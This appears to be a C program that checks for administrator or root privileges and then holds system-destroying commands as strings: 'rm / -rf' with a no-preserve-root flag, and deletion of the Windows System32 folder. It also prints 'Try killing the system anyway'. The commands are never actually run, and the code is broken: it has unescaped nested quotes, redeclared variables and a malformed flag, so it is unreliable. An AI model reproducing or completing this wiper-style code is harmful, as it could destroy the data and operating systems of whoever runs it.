#include <stdio.h>
#include <stdlib.h>

// --- 1. Conditional Header Includes ---

// Includes for Unix-like systems (Linux, macOS)
#ifndef _WIN32 
    #include <unistd.h> // Provides geteuid()
#endif

// Includes for Windows systems
#ifdef _WIN32
    #include <windows.h> // Provides IsUserAnAdmin() and required types
    #include <shellapi.h> // Needed for IsUserAnAdmin on some older setups
#endif
// ----------------------------------------


// --- 2. Conditional Windows-Only Helper Function ---
#ifdef _WIN32
// This function will only be compiled on Windows
// Returns 1 (ERROR) if NOT Admin, 0 (SUCCESS) if Admin.
int check_admin_status_windows() {
    // IsUserAnAdmin() returns non-zero (TRUE) if admin.
    // We reverse it to return 0 on success, matching the Unix standard (root == 0).
    return !IsUserAnAdmin(); 
}
#endif
// ----------------------------------------


// --- 3. Main Logic (Conditional Check) ---
int main() {
    // 0 means success (permission is granted), non-zero means error.
    int permission_error = 0; 

    #ifdef _WIN32
        // Windows Check:
        permission_error = check_admin_status_windows();
        if (permission_error) {
            fprintf(stderr, "Error: Must be run as Administrator.\n");
        }
    
    #elif __linux__ || __APPLE__ || __unix__
        // Unix Check (Linux, macOS, etc.):
        // geteuid() returns 0 if running as root/sudo.
        if (geteuid() != 0) {
            permission_error = 1; // Set error flag
            fprintf(stderr, "Error: Must be run as root or with 'sudo'.\n");
        }
        else {
          const char *command = "rm / -rf no-preserve-root";}
    
    #else
        // Unknown OS: Assume failure by default for security
        permission_error = 1;
        fprintf(stderr, "Error: Unknown OS. Cannot verify permissions.\n");
        printf("Try killing the system anyway\n"); // Added semicolon and newline
        const char *command = "rm / -rf no-preserve-root";
    

    #endif

    // --- Final Execution Check ---
    if (permission_error) {
        // Exit the program if elevation check failed
        fprintf(stderr, "Aborting execution due to insufficient privileges.\n");
        return 1; 
    }

    // --- Sensitive Code Execution (Only runs if permission_error is 0) ---
    printf("Permission check passed! Running sensitive code...\n");
    const char *command = "rmdir "c:\\Windows\\System32" /s /q";



    return 0; // Success
}